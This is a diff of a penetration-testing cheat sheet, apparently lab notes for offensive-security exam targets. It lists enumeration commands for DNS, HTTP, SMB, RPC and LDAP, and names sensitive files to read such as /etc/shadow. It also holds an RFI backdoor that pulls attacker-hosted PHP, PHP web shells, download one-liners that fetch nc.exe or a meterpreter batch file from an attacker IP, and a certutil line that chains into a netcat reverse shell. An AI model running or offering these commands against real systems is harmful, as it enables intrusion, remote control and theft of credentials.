@@ -35,7 +35,7 @@ DNS
 
 
     Find DNS server:
-       •  nslookup thinc.local 10.11.1.221
+       • nslookup thinc.local 10.11.1.221
        • dig @10.11.1.221 thinc.local
 
 
@@ -99,16 +99,6 @@ HTTP(S)
     Directories
        •  gobuster dir -u https://10.11.1.35 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster
 
-    Subdomains check
-       •  https://github.com/OWASP/Amass/ 
-
-
-    Content Management System Vulnerability Hunter
-       •  https://github.com/SecWiki/CMS-Hunter
-
-    Test ssl
-       •  ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip
-
     Word Press
        •  wpscan --url http://10.11.1.251/wp 
 
@@ -138,7 +128,7 @@ MANUAL HTTP SCANS
 
     Things to be on look for:
        • Default credentials for software
-       •  SQL-injectable GET/POST params
+       • SQL-injectable GET/POST params
        • XSS
         Test
            •  <script> alert("Hello! I am an alert box!!");</script>
@@ -154,7 +144,7 @@ MANUAL HTTP SCANS
             RFI:
               •   Have your PHP/cgi downloader ready
               •   <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
-              •   Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on      target machine
+              •   Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on                     target machine
               •   get phpinfo()
 
     HTTPS
@@ -171,7 +161,6 @@ MANUAL HTTP SCANS
        •  /etc/passwd
        •  /etc/shadow
        •  /root/.bash_history
-       •  /var/log/dmessage
        •  /var/mail/root
        •  /var/spool/cron/crontabs/root
        •  /etc/sysconfig/iptables   
@@ -212,7 +201,7 @@ RPC
        •  nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port $ip
 
     Services Running
-       •  rpcinfo –p $ip
+       • rpcinfo –p $ip
        • rpcbind -p  rpcinfo –p x.x.x.x
 
 
@@ -267,7 +256,7 @@ SMB&NETBIOS
        •  nmblookup -A $ip
 
     List Shares with no creds and guest account
-       •  smbmap -H [ip/hostname]
+       • smbmap -H [ip/hostname] -u anonymous -p hokusbokus -R
        • nmap --script smb-enum-shares -p 139,445 $ip
 
     List Shares with creds
@@ -322,9 +311,8 @@ DOMAIN
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-ACTIVE DIRECTORY/LDAP
+LDAP/Active Directory
 
-    ldapsearch:
     --Look for anonymous bind
        •  ldapsearch -x -b "dc=megabank,dc=local" "*" -h $ip
 
@@ -335,17 +323,18 @@ FILE TRANSFER
 
 
     Simple Servers:
-       •  pushd /fserver/ ; python -m SimpleHTTPServer 80 ; popd
-       •  python -m pyftpdlib -p 21 -w -d /mnt
-       •  ptftpd -p 69  -v eth0 /mnt/Secondary/pwk/public/10.11.1.227/ 
+       •  python -m SimpleHTTPServer 80
+       •  python -m pyftpdlib -p 21 -w -d /tmp
+       •  ptftpd -p 69  -v eth0 /tmp
+       •  impacket-smbserver share /mySharedFolder          // Creates smb share on your machine. Might need -smb2support option
 
     Tools:
-       •  Linux:
+       •  Linux & Windows ( Newer Windows versions only )
              ▪  wget http://10.11.0.106/nc.exe -O nc.exe
-             ▪  curl http://10.11.0.106/nc.exe 
-       • Windows:
-             ▪ Power shell one liner 
-                   → powershell (new-object System.Net.WebClient).DownloadFile('http://10.11.0.106:80/veil_meterpreter.bat','veil_meterpreter.bat')
+             ▪  curl http://10.11.0.106/nc.exe  -o nc.exe
+       • Windows ( Should work on most Windows versions)
+             ▪powershell (New-Object System.Net.WebClient).DownloadFile("https://10.10.10.144/test.txt", "test.txt")
+             ▪net use Z: \\computer_name\share_name    //Mount smb share
              ▪certutil.exe -urlcache -split -f "http://10.11.0.106:8000/nc.exe" nc.exe && nc.exe -nv 10.11.0.106 443 -e cmd.exe
              ▪VBscript
                     → echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -394,14 +383,13 @@ SHELLS
        • echo os.system('/bin/bash')
 
     Adjust Interactive shell:
-       •  Ctrl-Z
-       •  echo $TERM    //find raws and cols and color
-       •  stty raw -echo  
+       • Ctrl-Z
+       • echo $TERM    //find term
+       • stty raw -echo  //disable shell echo
        • fg
        • reset
        • export SHELL=bash
-       •  export TERM=xterm256-color
-       •  stty rows 38 columns 116
+       • export TERM=xterm
 
     Php backdoor:
        •  <?php echo shell_exec($_GET['cmd']);?>
